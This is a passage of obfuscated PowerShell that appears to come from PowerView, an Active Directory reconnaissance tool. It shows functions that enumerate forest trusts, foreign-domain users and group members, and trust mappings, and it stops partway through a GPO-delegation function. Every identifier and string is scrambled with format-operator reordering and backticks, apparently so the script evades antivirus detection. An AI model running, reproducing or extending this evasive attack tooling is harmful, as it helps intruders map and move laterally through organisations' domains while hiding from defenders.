                ${FouNDd`Om`AIn}.("{3}{2}{1}{6}{4}{0}{5}" -f 'nsh','llT','A','Get','atio','ips','rustRel').Invoke() | &("{0}{3}{4}{2}{1}"-f'Fo','t','bjec','rE','ach-O') {
                    ${_}."psOb`Ject"."tYP`ENA`meS".("{1}{0}"-f'ert','Ins').Invoke(0, ("{2}{3}{1}{0}{4}" -f'inTrust.NE','oma','Pow','erView.D','T'))
                    ${_}
                }
            }
        }
    }
}


function get-foR`ES`TTr`UST {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{3}{4}{1}" -f'SSho','s','P','uldP','roces'}, '')]
    [OutputType({"{3}{4}{1}{2}{0}{5}{6}"-f'orest','w.','F','Powe','rVie','Trust','.NET'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSitioN = 0, ValUEfRoMpIpElIne = ${t`RuE}, ValuEFroMpiPELInEbYPrOpErtyNAME = ${t`RuE})]
        [Alias({"{1}{0}" -f'ame','N'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${F`oresT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cr`Ed`enTIAl} =   (  &("{2}{0}{1}"-f 'ariabl','E','V') ("{0}{1}" -f'5R0','Vk'))."vA`LUe"::"eM`PtY"
    )

    PROCESS {
        ${neTfO`R`EstA`RgU`mEn`Ts} = @{}
        if (${PsBo`UnDpA`RaME`Te`Rs}[("{0}{1}" -f'F','orest')]) { ${n`etF`OResTA`R`gUMe`Nts}[("{1}{0}"-f'est','For')] = ${For`e`sT} }
        if (${Psb`ouND`parA`METerS}[("{0}{1}{2}" -f'Cred','enti','al')]) { ${neTf`orE`St`A`RgumentS}[("{3}{2}{0}{1}" -f 'a','l','redenti','C')] = ${cRE`De`NtiaL} }

        ${fOuNd`F`OrE`st} = &("{3}{0}{2}{1}" -f 'et','est','-For','G') @NetForestArguments

        if (${Fo`UN`dFoREST}) {
            ${foU`ND`FoReST}.("{4}{3}{1}{5}{2}{0}"-f'nships','ustR','latio','Tr','GetAll','e').Invoke() | &("{3}{2}{0}{1}" -f 'ach-Ob','ject','orE','F') {
                ${_}."Ps`O`BJEcT"."typ`ENAM`ES".("{0}{1}" -f 'Inser','t').Invoke(0, ("{2}{3}{4}{1}{6}{5}{0}"-f'ust.NET','w','P','owerVi','e','restTr','.Fo'))
                ${_}
            }
        }
    }
}


function geT-`d`oM`A`i`NfOREI`gnuseR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{2}" -f'hould','Pro','cess','PSS'}, '')]
    [OutputType({"{6}{2}{3}{5}{0}{4}{1}" -f 'r','er','owerV','ie','eignUs','w.Fo','P'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSItION = 0, valUEFROMPIPelInE = ${T`RUE}, VaLuEfroMpipELINeBYProPErtYname = ${t`RUE})]
        [Alias({"{0}{1}"-f'N','ame'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${d`O`maIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'r','Filte'})]
        [String]
        ${L`D`A`PfilTer},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRoP`E`R`Ties},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'ADSPat','h'})]
        [String]
        ${s`Ea`RchBAse},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{1}{0}{3}{5}{2}" -f 'nC','ai','er','o','Dom','ntroll'})]
        [String]
        ${se`R`VeR},

        [ValidateSet({"{1}{0}" -f'ase','B'}, {"{1}{0}{2}" -f 'neL','O','evel'}, {"{2}{1}{0}"-f 'ee','tr','Sub'})]
        [String]
        ${sea`R`CH`SCOPE} = ("{0}{1}"-f'Sub','tree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ResULTPa`GE`s`izE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${ServE`RTi`MELi`mIt},

        [ValidateSet({"{0}{1}"-f'D','acl'}, {"{0}{1}" -f 'Gro','up'}, {"{0}{1}"-f'No','ne'}, {"{0}{1}" -f'O','wner'}, {"{1}{0}"-f 'acl','S'})]
        [String]
        ${s`EcU`RIT`yma`sKS},

        [Switch]
        ${TOmB`s`ToNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RedEnti`AL} =   (&("{1}{0}" -f 'cI','G') ('VAr'+'IAbl'+'e:'+'5r0'+'VK'))."vA`lue"::"em`PTy"
    )

    BEGIN {
        ${s`eaRCHE`Ra`RGu`mENts} = @{}
        ${seAR`ChEra`RgUm`EN`TS}[("{0}{1}{2}"-f 'LD','APFi','lter')] = ("{0}{2}{1}"-f'(memberof=',')','*')
        if (${PSboU`N`DpaRAMeTe`RS}[("{1}{0}"-f'omain','D')]) { ${seaR`cheRAr`g`U`Me`NTS}[("{1}{0}" -f 'main','Do')] = ${d`Oma`iN} }
        if (${pSB`OU`N`DPaRa`mEtERs}[("{1}{0}{2}" -f 'i','Propert','es')]) { ${se`A`RCh`eRaRGuM`eNTS}[("{2}{1}{0}"-f'ies','ert','Prop')] = ${proPer`Ti`es} }
        if (${P`S`BOuNDp`ARaMeTeRs}[("{2}{0}{1}"-f 'earchBa','se','S')]) { ${sEaRC`HEra`RG`UMEN`TS}[("{1}{2}{0}" -f 'hBase','Se','arc')] = ${Se`A`RcHbAse} }
        if (${psbO`UNdPArAm`E`T`E`RS}[("{0}{1}"-f 'Serve','r')]) { ${SE`ArC`HerARG`UMeNTs}[("{1}{0}{2}"-f 'e','Serv','r')] = ${sE`Rver} }
        if (${pSboU`Nd`Par`A`Me`TeRs}[("{0}{2}{1}{3}" -f 'Se','chSco','ar','pe')]) { ${S`eAR`chEr`Ar`gUmEnts}[("{1}{3}{0}{2}" -f 'co','Sea','pe','rchS')] = ${Se`ARCHS`C`opE} }
        if (${P`SBO`UNd`PAR`AmEtERs}[("{0}{1}{2}" -f'ResultPa','geS','ize')]) { ${seAr`cHe`R`ArGUme`NTs}[("{1}{4}{2}{3}{0}" -f'e','Res','tPag','eSiz','ul')] = ${r`ESuLTP`A`gESiZe} }
        if (${pSBo`Un`dPa`R`A`mETErS}[("{2}{3}{1}{4}{0}" -f'mit','er','Se','rv','TimeLi')]) { ${SEa`RCHeR`ARgu`meNTs}[("{3}{1}{2}{0}" -f 't','er','verTimeLimi','S')] = ${SE`Rve`RtIMelI`MIt} }
        if (${PsbO`UndpaR`AMEtE`RS}[("{0}{1}{2}" -f'SecurityMas','k','s')]) { ${seARChe`RaR`gUMe`NTS}[("{2}{1}{3}{0}" -f's','urity','Sec','Mask')] = ${S`eCu`RITY`mASks} }
        if (${Psbo`UND`pARamE`TErs}[("{1}{0}{2}"-f'mbst','To','one')]) { ${S`EARChERa`RGu`m`ENts}[("{2}{3}{0}{1}"-f 'on','e','To','mbst')] = ${TO`mbS`T`oNe} }
        if (${pS`Bou`Nd`Par`AM`EtErS}[("{1}{2}{0}"-f'ial','C','redent')]) { ${sea`RChE`RaRGU`meN`Ts}[("{2}{1}{0}"-f 'edential','r','C')] = ${cR`ED`eNT`IAl} }
        if (${p`S`BOUNDp`A`RamEte`RS}['Raw']) { ${s`eARc`HeRa`RGU`menTS}['Raw'] = ${r`Aw} }
    }

    PROCESS {
        &("{1}{2}{0}{3}" -f 'ainU','Get-Do','m','ser') @SearcherArguments  | &("{1}{0}{2}{3}"-f'E','For','ach-','Object') {
            ForEach (${meM`BERSH`IP} in ${_}."mE`m`BErOF") {
                ${in`D`ex} = ${MEM`BE`RsHIp}.("{0}{1}" -f 'Inde','xOf').Invoke('DC=')
                if (${i`NDEx}) {

                    ${grouP`do`mAIN} = $(${MeMbe`R`sH`IP}.("{1}{2}{0}" -f'g','Sub','Strin').Invoke(${I`N`DEX})) -replace 'DC=','' -replace ',','.'
                    ${uSE`RDi`st`InGu`ISH`EDna`mE} = ${_}."DI`STInGU`ISHE`dNaMe"
                    ${U`sEriNd`ex} = ${USerDi`Stin`gU`isHEd`N`A`Me}.("{2}{0}{1}" -f 'exO','f','Ind').Invoke('DC=')
                    ${uSE`RDO`mA`iN} = $(${_}."Di`s`TI`NguIsHEd`NamE".("{2}{1}{0}" -f 'String','ub','S').Invoke(${U`SEr`ind`Ex})) -replace 'DC=','' -replace ',','.'

                    if (${gRo`UPD`O`MaiN} -ne ${U`SERd`OmAIn}) {
                        
                        ${grO`U`pNaME} = ${me`mB`ErShIp}.("{0}{1}"-f 'Spli','t').Invoke(',')[0].("{1}{0}"-f 'plit','s').Invoke('=')[1]
                        ${fo`R`EIgNuSeR} = &("{0}{2}{1}" -f'N','-Object','ew') ("{0}{2}{1}" -f'PSObj','t','ec')
                        ${FO`Re`Ign`UsEr} | &("{2}{3}{0}{1}" -f 'Mem','ber','A','dd-') ("{0}{2}{1}{3}" -f'N','tep','o','roperty') ("{1}{0}{2}"-f 'serDo','U','main') ${us`E`RDOMa`in}
                        ${fOREignu`S`er} | &("{1}{0}{2}"-f'-','Add','Member') ("{1}{2}{3}{0}" -f 'rty','N','otep','rope') ("{2}{1}{0}" -f'ame','rN','Use') ${_}."SA`M`AccoUn`TnamE"
                        ${f`OreIG`Nu`ser} | &("{0}{1}{2}"-f 'Add-','M','ember') ("{1}{0}{2}"-f 'r','Notep','operty') ("{3}{0}{4}{1}{2}{5}"-f'ser','sting','uishedNa','U','Di','me') ${_}."diST`ingu`Is`h`ednaMe"
                        ${F`OrEI`gnUseR} | &("{1}{2}{0}" -f 'r','Add','-Membe') ("{1}{3}{2}{0}" -f'operty','No','r','tep') ("{1}{2}{0}" -f'n','G','roupDomai') ${gR`Ou`pDOMA`In}
                        ${FoReI`gNuS`ER} | &("{1}{2}{0}"-f 'r','Add-Me','mbe') ("{2}{0}{1}" -f'op','erty','Notepr') ("{2}{1}{0}" -f'me','upNa','Gro') ${G`ROUPNa`mE}
                        ${forEi`gnu`SEr} | &("{1}{0}{2}" -f'dd-Memb','A','er') ("{1}{3}{2}{0}" -f'y','Notep','t','roper') ("{1}{4}{3}{0}{2}"-f'dN','G','ame','pDistinguishe','rou') ${m`em`BErSHIP}
                        ${F`orei`GNUs`eR}."PSo`B`jEct"."TY`pEna`meS".("{0}{2}{1}" -f'I','t','nser').Invoke(0, ("{2}{5}{4}{1}{0}{3}" -f'eignUse','r','Powe','r','Fo','rView.'))
                        ${For`eiGNu`SeR}
                    }
                }
            }
        }
    }
}


function gEt-DoMaiNFOR`eI`G`NgRO`U`pMeMBeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}"-f 'houldPr','PSS','s','oces'}, '')]
    [OutputType({"{0}{6}{1}{3}{5}{2}{4}"-f 'Po','ew.ForeignG','e','rou','r','pMemb','werVi'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSITIoN = 0, VALUEfromPIPelIne = ${t`RUE}, vaLUeFROmPiPELinEByPROperTyNaME = ${T`RUe})]
        [Alias({"{0}{1}" -f'Na','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${dOM`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'ter','Fil'})]
        [String]
        ${LdAP`FI`LTER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pro`pe`RtiEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f 'A','ath','DSP'})]
        [String]
        ${Sea`R`ChBA`SE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}{3}"-f'l','ntro','DomainCo','ler'})]
        [String]
        ${seRV`Er},

        [ValidateSet({"{0}{1}" -f 'Bas','e'}, {"{0}{2}{1}" -f'One','evel','L'}, {"{0}{1}{2}"-f 'Su','btre','e'})]
        [String]
        ${S`ea`RcHsCO`pE} = ("{0}{1}{2}"-f 'S','ubtre','e'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reSUltp`AGE`SiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`e`RvEr`Tim`eLIm`It},

        [ValidateSet({"{1}{0}" -f'acl','D'}, {"{1}{0}"-f 'p','Grou'}, {"{0}{1}" -f'No','ne'}, {"{0}{1}" -f 'Owne','r'}, {"{1}{0}"-f'l','Sac'})]
        [String]
        ${S`ecUrIT`yMaSks},

        [Switch]
        ${To`M`BsTONE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`edEn`TI`AL} =   (&("{2}{0}{1}"-f'ab','le','varI') ('5R0'+'VK') )."V`AlUE"::"e`mpTy"
    )

    BEGIN {
        ${Sea`R`CHE`RArgU`MEntS} = @{}
        ${seARCHeR`A`RG`UmEntS}[("{3}{1}{0}{2}"-f'ilt','DAPF','er','L')] = ("{0}{1}{2}" -f '(m','e','mber=*)')
        if (${PsBOUNdPA`Ram`EtE`RS}[("{0}{2}{1}"-f'Dom','n','ai')]) { ${seA`RCh`e`RargUMENTs}[("{1}{0}" -f'omain','D')] = ${D`O`main} }
        if (${pS`B`OUNDpARAMeTE`RS}[("{1}{0}{2}"-f 'rope','P','rties')]) { ${SEa`R`c`hEraRg`UMe`NtS}[("{2}{1}{0}" -f'rties','pe','Pro')] = ${pRoP`eR`Ties} }
        if (${P`S`BOu`NdpARAMETeRS}[("{2}{1}{0}" -f 'Base','rch','Sea')]) { ${SEArc`her`ArgUme`NTs}[("{2}{1}{0}"-f 'rchBase','ea','S')] = ${SeA`RCh`BASE} }
        if (${PsBouN`Dpa`Ra`meT`ers}[("{2}{0}{1}"-f've','r','Ser')]) { ${SeaRC`HeR`A`RgUM`Ents}[("{1}{0}"-f'ver','Ser')] = ${sEr`VeR} }
        if (${psB`OUNDP`AR`AMeT`ers}[("{1}{0}{2}{3}"-f 'ear','S','ch','Scope')]) { ${sEAr`Che`Rar`gU`meNTS}[("{2}{1}{0}"-f'ope','c','SearchS')] = ${seA`Rc`hsCO`Pe} }
        if (${pS`B`Ou`NDPARamETERS}[("{3}{2}{0}{1}"-f 'ageSiz','e','ltP','Resu')]) { ${SEa`R`cheRaRG`Umen`Ts}[("{1}{2}{4}{0}{3}"-f'Pa','Res','u','geSize','lt')] = ${rEsU`Lt`pA`geSIZe} }
        if (${P`Sbo`Un`dPA`RAmEtERs}[("{4}{0}{2}{3}{1}" -f'ver','t','Ti','meLimi','Ser')]) { ${s`eArChERA`RGUME`N`TS}[("{3}{1}{0}{2}" -f 'imeL','rT','imit','Serve')] = ${S`eRveRTImELIm`iT} }
        if (${ps`B`Ou`Ndp`ARaM`EtErs}[("{2}{3}{4}{0}{1}"-f's','ks','Se','cur','ityMa')]) { ${s`EA`R`CherArguMENTs}[("{0}{2}{1}"-f 'Secur','yMasks','it')] = ${Secur`I`Ty`MaskS} }
        if (${pS`BOUn`D`p`AramE`TErS}[("{3}{0}{1}{2}" -f'mbst','o','ne','To')]) { ${SeARCHEraRg`Um`E`Nts}[("{2}{0}{1}{3}"-f't','o','Tombs','ne')] = ${T`O`MbSTO`Ne} }
        if (${psB`oU`NdPAra`MeTE`Rs}[("{2}{1}{0}"-f'tial','reden','C')]) { ${sEa`Rc`HE`Rar`gUmE`NTS}[("{0}{2}{1}"-f 'C','al','redenti')] = ${CReD`enti`Al} }
        if (${ps`BoUNDP`Aram`E`TErS}['Raw']) { ${SE`Arc`He`RargumEN`TS}['Raw'] = ${R`Aw} }
    }

    PROCESS {
        
        ${EXC`LUd`EGR`oU`pS} = @(("{0}{1}"-f 'User','s'), ("{2}{1}{3}{0}" -f 's','s','Domain U','er'), ("{1}{0}" -f 'sts','Gue'))

        &("{1}{4}{3}{0}{2}" -f 'G','Get-D','roup','in','oma') @SearcherArguments | &("{0}{2}{1}" -f'Whe','bject','re-O') { ${E`xCl`Ud`EGRoups} -notcontains ${_}."SaM`ACCO`UN`Tn`Ame" } | &("{1}{2}{0}"-f 'h-Object','ForEa','c') {
            ${g`Rou`Pn`AME} = ${_}."saMaC`coUN`TnA`me"
            ${gRoUP`Di`STI`NGUi`SheDn`Ame} = ${_}."dIsTing`UIs`H`Edna`ME"
            ${GRO`Up`DomaiN} = ${Gr`OuPd`IstIn`GU`ishEDnaME}.("{2}{0}{1}"-f 'i','ng','SubStr').Invoke(${GRouPdIS`TiN`guiS`hEDnAme}.("{2}{1}{0}"-f'f','exO','Ind').Invoke('DC=')) -replace 'DC=','' -replace ',','.'

            ${_}."mem`B`er" | &("{2}{3}{0}{1}"-f'jec','t','ForEa','ch-Ob') {
                
                
                ${MEM`BeR`D`o`MaiN} = ${_}.("{2}{1}{0}" -f'g','rin','SubSt').Invoke(${_}.("{1}{0}{2}"-f'e','Ind','xOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                if ((${_} -match ("{3}{1}{0}{2}" -f'21','-1-5-','.*-.*','CN=S')) -or (${gRoUp`dOM`A`iN} -ne ${MEmB`ERD`O`mAIN})) {
                    ${MEmber`d`IS`TING`U`isheDn`AmE} = ${_}
                    ${MemBe`RN`AmE} = ${_}.("{0}{1}"-f'Spl','it').Invoke(',')[0].("{0}{1}"-f'sp','lit').Invoke('=')[1]

                    ${ForEigN`gROuPM`E`mber} = &("{3}{1}{2}{0}" -f't','-Obj','ec','New') ("{0}{2}{1}" -f'PSObj','t','ec')
                    ${ForeiGNgRO`U`p`meM`BeR} | &("{1}{2}{0}"-f 'Member','Add','-') ("{1}{2}{0}{3}"-f'roper','Note','p','ty') ("{0}{2}{3}{1}" -f 'Gro','omain','u','pD') ${grO`UpDOm`AiN}
                    ${F`Or`EIgNgRO`UPMe`M`Ber} | &("{3}{1}{0}{2}" -f 'b','m','er','Add-Me') ("{0}{1}{2}" -f 'Noteprope','r','ty') ("{0}{1}{2}" -f 'Grou','p','Name') ${GRou`pN`Ame}
                    ${fo`R`eig`NGROUpM`emB`ER} | &("{0}{2}{1}"-f 'Ad','mber','d-Me') ("{1}{0}{2}" -f 'ot','N','eproperty') ("{5}{2}{0}{4}{3}{1}" -f'upDistingui','dName','ro','he','s','G') ${GROU`pDI`ST`Ing`U`ishednAmE}
                    ${F`oReIgN`Gro`UpmemB`Er} | &("{0}{1}{2}" -f'Add','-Me','mber') ("{3}{0}{1}{2}"-f 'ot','ep','roperty','N') ("{1}{0}{2}" -f'em','M','berDomain') ${MembE`R`Doma`IN}
                    ${fORe`iGN`GR`oU`pMEMBER} | &("{3}{2}{0}{1}"-f'M','ember','dd-','A') ("{2}{3}{0}{1}" -f'ert','y','Notepr','op') ("{2}{0}{1}"-f'er','Name','Memb') ${memBE`RN`Ame}
                    ${FOR`E`Ign`gr`ouP`MemBEr} | &("{0}{2}{1}"-f'Ad','ber','d-Mem') ("{3}{1}{0}{2}"-f'r','eprope','ty','Not') ("{0}{3}{2}{5}{1}{4}"-f'M','edNa','stingui','emberDi','me','sh') ${M`eMb`ErDi`STIngu`I`SH`Edn`AMe}
                    ${f`OREigngRoUpMEM`B`ER}."psObJE`CT"."T`YPen`AM`ES".("{0}{1}" -f'I','nsert').Invoke(0, ("{8}{5}{0}{1}{3}{2}{7}{6}{4}" -f'e','w.Fo','eignG','r','ber','werVi','em','roupM','Po'))
                    ${FOrei`gn`Gr`Oup`M`EmBER}
                }
            }
        }
    }
}


function g`Et-dOmaINt`RU`S`TM`A`PpiNG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{2}{0}{1}"-f 'e','ss','ldProc','P','SShou'}, '')]
    [OutputType({"{4}{0}{3}{6}{1}{2}{5}"-f 'owe','n','Trust.','rV','P','NET','iew.Domai'})]
    [OutputType({"{4}{1}{2}{0}{3}"-f'm','er','View.Do','ainTrust.LDAP','Pow'})]
    [OutputType({"{2}{3}{4}{1}{0}" -f '.API','nTrust','PowerView.','Doma','i'})]
    [CmdletBinding(dEfAUlTPArAMetersetNaME = {"{0}{1}" -f 'L','DAP'})]
    Param(
        [Parameter(paraMeTErSeTNAmE = 'API')]
        [Switch]
        ${A`pi},

        [Parameter(paraMEteRseTName = 'NET')]
        [Switch]
        ${N`ET},

        [Parameter(pArametErSETname = "ld`Ap")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'F','ilter'})]
        [String]
        ${l`DaPF`IlTER},

        [Parameter(paramEtErsetnAmE = "LD`AP")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`ROpe`RT`IeS},

        [Parameter(PaRAmeteRsETnamE = "lD`Ap")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f'h','DSPat','A'})]
        [String]
        ${seaRch`Ba`se},

        [Parameter(pARameTerSeTnAME = "ld`Ap")]
        [Parameter(pARaMeTERsETNamE = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'ller','Doma','inContro'})]
        [String]
        ${S`erVER},

        [Parameter(PARAmeTERsEtnaME = "l`DAP")]
        [ValidateSet({"{0}{1}" -f'B','ase'}, {"{1}{0}" -f 'neLevel','O'}, {"{1}{0}"-f 'ubtree','S'})]
        [String]
        ${SE`ARCHSC`O`PE} = ("{0}{1}"-f 'Sub','tree'),

        [Parameter(paramEtErsetnAme = "l`dAP")]
        [ValidateRange(1, 10000)]
        [Int]
        ${RE`sultPAGes`Ize} = 200,

        [Parameter(paRAmetERSetName = "Ld`Ap")]
        [ValidateRange(1, 10000)]
        [Int]
        ${SEr`VeRTi`meL`I`miT},

        [Parameter(pARAMetErsETnaMe = "L`Dap")]
        [Switch]
        ${tom`B`stonE},

        [Parameter(pArAMetERSETName = "LD`AP")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`ED`en`TiAL} =   ( &("{2}{3}{0}{1}"-f'a','RIABle','g','eT-V') ("5"+"r0Vk")  -vALu)::"E`MPty"
    )

    
    ${see`NDO`mAInS} = @{}

    
    ${d`Omai`Ns} = &("{1}{0}{2}"-f 'e','N','w-Object') ("{1}{3}{5}{4}{7}{6}{2}{0}" -f'ck','Sy','a','stem.Colle','t','c','ons.St','i')

    ${DO`MaINtrU`staRG`UMen`Ts} = @{}
    if (${P`sBoU`N`dpArame`TErs}['API']) { ${dOmAinTRu`sTargu`men`TS}['API'] = ${A`pi} }
    if (${PS`B`ouNdpARAM`EtERS}['NET']) { ${DomA`iNTrUst`Ar`g`U`mEn`Ts}['NET'] = ${n`eT} }
    if (${pSBOUnDp`AR`Amet`ErS}[("{1}{2}{0}" -f 'r','LDAP','Filte')]) { ${D`OM`Ai`N`TRuSTAR`gUMENTs}[("{3}{1}{0}{2}"-f'lte','DAPFi','r','L')] = ${LDa`pF`iLt`eR} }
    if (${Psb`OuN`DpaRa`MeteRS}[("{1}{0}{2}" -f 'rope','P','rties')]) { ${doM`A`iNT`RuSTARG`UMentS}[("{2}{1}{0}"-f 'perties','ro','P')] = ${PrOPe`R`TIes} }
    if (${pSbo`U`NdPa`Ram`EtErs}[("{0}{2}{1}"-f 'SearchB','e','as')]) { ${dO`MaINTr`Ust`A`RGum`EnTs}[("{2}{0}{1}" -f 'hBa','se','Searc')] = ${s`e`ARch`BAsE} }
    if (${pS`Bou`NDP`AramETeRs}[("{1}{0}" -f'er','Serv')]) { ${DoMa`iNt`RustaRgUmeN`Ts}[("{1}{2}{0}" -f 'r','Se','rve')] = ${Se`RVEr} }
    if (${PsBOuND`PAR`AmETE`Rs}[("{2}{1}{0}" -f 'pe','earchSco','S')]) { ${DO`MA`i`NT`RU`StArGUmENts}[("{1}{0}{2}" -f'o','SearchSc','pe')] = ${Se`AR`Chscope} }
    if (${PS`BOuN`d`pAr`A`MeTErs}[("{2}{1}{3}{0}" -f 'Size','ult','Res','Page')]) { ${DOm`AIntRustAR`gU`mEN`Ts}[("{0}{1}{4}{2}{3}"-f 'ResultP','ageS','z','e','i')] = ${reSUlTP`AG`eS`I`ZE} }
    if (${PS`BOUN`dPA`RamETeRS}[("{2}{3}{4}{1}{0}" -f 'eLimit','m','Ser','v','erTi')]) { ${DOm`AINtrUStArGUM`en`TS}[("{0}{2}{1}{4}{3}" -f'Server','e','Tim','imit','L')] = ${seR`VeR`T`imeLIMit} }
    if (${pS`BOU`NDP`ArAMetE`Rs}[("{2}{0}{1}" -f'om','bstone','T')]) { ${dOMA`iNtr`UST`Arg`UmEn`Ts}[("{1}{2}{0}"-f 'tone','Tom','bs')] = ${T`oMB`StoNE} }
    if (${p`sB`oUNdPA`RAmeTeRS}[("{0}{2}{1}"-f 'Cre','l','dentia')]) { ${doMAI`N`TrUsTarg`UmEntS}[("{0}{1}{2}{3}"-f 'Crede','nt','ia','l')] = ${crEDE`N`TIAl} }

    
    if (${PsBoUNDPar`AM`EtE`Rs}[("{1}{2}{3}{0}"-f 'tial','Cr','ed','en')]) {
        ${cUR`R`E`Ntd`omain} = (&("{1}{0}{2}"-f 'a','Get-Dom','in') -Credential ${cReDE`Nti`AL})."n`AME"
    }
    else {
        ${C`UR`RENT`DoMa`in} = (&("{1}{0}{2}"-f't-D','Ge','omain'))."NA`mE"
    }
    ${Do`mAi`NS}.("{1}{0}"-f 'ush','P').Invoke(${CuR`ReNtd`o`Main})

    while(${d`omAi`NS}."c`OUNT" -ne 0) {

        ${dO`MA`iN} = ${dOm`A`Ins}.("{0}{1}" -f 'P','op').Invoke()

        
        if (${DO`ma`IN} -and (${D`OmAIN}.("{0}{1}" -f 'T','rim').Invoke() -ne '') -and (-not ${SEEnd`o`MaInS}.("{2}{0}{1}" -f'tains','Key','Con').Invoke(${DOmA`IN}))) {

            &("{2}{3}{0}{1}"-f '-Verb','ose','Wri','te') ('[G'+'e'+'t-Domai'+'nTr'+'us'+'tMap'+'ping]'+' '+'Enume'+'r'+'ati'+'ng '+'trust'+'s '+'for'+' '+'doma'+'in:'+' '+"'$Domain'")

            
            ${Nu`ll} = ${S`eEnDoM`AInS}.("{0}{1}" -f 'A','dd').Invoke(${d`Om`AIn}, '')

            try {
                
                ${DOmaI`Ntru`st`Arg`UmEnTS}[("{0}{2}{1}"-f'Do','ain','m')] = ${D`O`maIN}
                ${t`RuSTs} = &("{1}{2}{0}"-f'Trust','Get-Dom','ain') @DomainTrustArguments

                if (${T`RustS} -isnot [System.Array]) {
                    ${tRU`S`TS} = @(${TRU`sTS})
                }

                
                if (${p`Sc`mdL`ET}.pARAmETeRsETNamE -eq 'NET') {
                    ${F`O`REsTTruS`TArG`U`MeNts} = @{}
                    if (${PS`BO`UND`pArAMEtE`Rs}[("{1}{0}" -f 'st','Fore')]) { ${FORESt`T`RU`stA`RgumeNTs}[("{1}{0}"-f 'rest','Fo')] = ${FOr`eSt} }
                    if (${P`sB`OU`N`DparaMETErs}[("{1}{2}{0}"-f'ntial','Cre','de')]) { ${forestt`RUsT`AR`guMeNts}[("{0}{2}{1}" -f 'Cred','al','enti')] = ${CRe`Den`TiAl} }
                    ${TruS`TS} += &("{2}{1}{0}{3}" -f'Trus','-Forest','Get','t') @ForestTrustArguments
                }

                if (${tRus`Ts}) {
                    if (${T`R`USTs} -isnot [System.Array]) {
                        ${T`R`UStS} = @(${TrU`sts})
                    }

                    
                    ForEach (${T`RUst} in ${T`RuSTs}) {
                        if (${tR`Ust}."sOUr`c`enAmE" -and ${tRu`sT}."t`A`RGEtNAme") {
                            
                            ${n`Ull} = ${D`OMai`Ns}.("{1}{0}"-f 'sh','Pu').Invoke(${T`Ru`ST}."tarG`Etn`AME")
                            ${T`RU`sT}
                        }
                    }
                }
            }
            catch {
                &("{1}{2}{0}"-f 'se','Write-Ver','bo') ('[Ge'+'t-'+'DomainT'+'rustMappin'+'g] '+'E'+'rro'+'r: '+"$_")
            }
        }
    }
}


function Ge`T-GpOde`le`GATI`ON {


    [CmdletBinding()]
    Param (
        [String]
        ${g`po`NAME} = '*',

        [ValidateRange(1,10000)] 
        [Int]
        ${pA`ge`SizE} = 200
    )

    ${exc`L`USIons} = @(("{1}{0}" -f 'TEM','SYS'),("{3}{1}{0}{2}"-f'i','a','n Admins','Dom'),("{2}{1}{3}{0}"-f'ins',' Ad','Enterprise','m'))

    ${FO`Re`ST} =  (&("{0}{1}{2}" -f 'vAriaB','l','e')  ("1I"+"n") )."V`ALUe"::("{0}{3}{1}{2}" -f'G','ntFo','rest','etCurre').Invoke()
    ${doMAinL`I`St} = @(${foR`ESt}."D`oM`AINS")
    ${do`M`AinS} = ${dO`m`AinliSt} | &("{2}{0}{1}"-f 'ac','h','fore') { ${_}.("{0}{3}{1}{2}" -f 'GetD','or','yEntry','irect').Invoke() }
    foreach (${DO`M`AIN} in ${D`o`maInS}) {
        ${Fi`lTer} = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        ${Se`ARcher} = &("{1}{0}{2}"-f'-','New','Object') ("{10}{4}{3}{8}{5}{2}{9}{0}{6}{1}{7}"-f'r','rySea','ices','ector','ir','erv','ecto','rcher','yS','.Di','System.D')
        ${sEarCH`Er}."S`eA`RCHR`oot" = ${D`OM`AIn}
        ${S`e`ArcheR}."Fi`lT`ER" = ${fIL`TER}
        ${Se`Ar`c`Her}."P`AGESIzE" = ${pA`gE`SI`zE}
        ${seA`R`C`hEr}."S`Ea`RCHsC`OpE" = ("{0}{1}{2}"-f 'Subt','re','e')
        ${Li`st`gPo} = ${S`e`ArcheR}.("{1}{0}"-f'll','FindA').Invoke()
        foreach (${g`PO} in ${L`Ist`gPo}){
